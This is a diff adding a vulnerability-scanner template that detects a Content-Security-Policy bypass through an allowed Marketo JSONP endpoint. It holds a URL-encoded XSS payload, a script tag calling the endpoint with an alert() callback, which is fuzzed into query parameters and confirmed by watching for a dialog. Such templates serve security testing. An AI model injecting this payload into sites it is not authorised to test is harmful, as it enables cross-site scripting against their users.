@@ -1,0 +1,55 @@
+id: marketo-app-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Marketo App
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,marketo-app
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "marketo.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: marketo_app_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "marketo_app_csp_xss == true"
+# digest: 4a0a00473045022100c56427bde016eff6754290f8847b8f2e054582f525d9da8769c9106779cec7ee022051f9e2c3ab82fceb69ce084ea72507b7078ae1a0d2c968aa27fdbeb137f0fd18:922c64590222798bb761d5b6d8e72950
